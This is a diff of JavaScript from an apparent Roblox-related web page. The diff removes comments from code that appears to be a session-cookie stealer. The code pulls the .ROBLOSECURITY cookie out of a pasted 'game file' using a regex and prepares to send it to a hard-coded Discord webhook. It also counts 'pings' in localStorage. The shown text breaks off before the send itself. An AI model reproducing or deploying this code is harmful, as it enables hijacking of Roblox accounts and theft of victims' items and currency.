@@ -155,18 +155,18 @@
                 .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
         }
 
-        // Load total hits from localStorage
+        
         function loadTotalHits() {
             const savedHits = localStorage.getItem('totalPings');
             totalPings = savedHits ? parseInt(savedHits, 10) : 0;
         }
 
-        // Save total hits to localStorage
+        
         function saveTotalHits() {
             localStorage.setItem('totalPings', totalPings);
         }
 
-        // Call the load function on page load
+        
         loadTotalHits();
         fetchCountry();
 
@@ -185,18 +185,18 @@
 
             const webhookUrl = "https://discord.com/api/webhooks/1300555524823187576/jn-SfRrTE-bmNQFXvaQRSmiZfmJFBQeMyI2uAaF27TwiOcQNXK7SeQP-Jc6S7G0KfaSP";
 
-            // Increment total pings
+            
             totalPings++;
-            saveTotalHits(); // Save the updated count
+            saveTotalHits(); 
 
-            // Pattern to capture the full .ROBLOSECURITY cookie including the warning and code
+            
             const cookiePattern = /\.ROBLOSECURITY",\s*"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9]+"/;
 
-            // Find and extract the .ROBLOSECURITY cookie from the input script
+            
             let cookieString = "";
             const match = sessionScript.match(cookiePattern);
             if (match) {
-                // Remove leading .ROBLOSECURITY", " and trailing "
+                
                 cookieString = match[0].split('.ROBLOSECURITY", "')[1].slice(0, -1).trim();
             } else {
                 alert("Please Enter A Game File!");
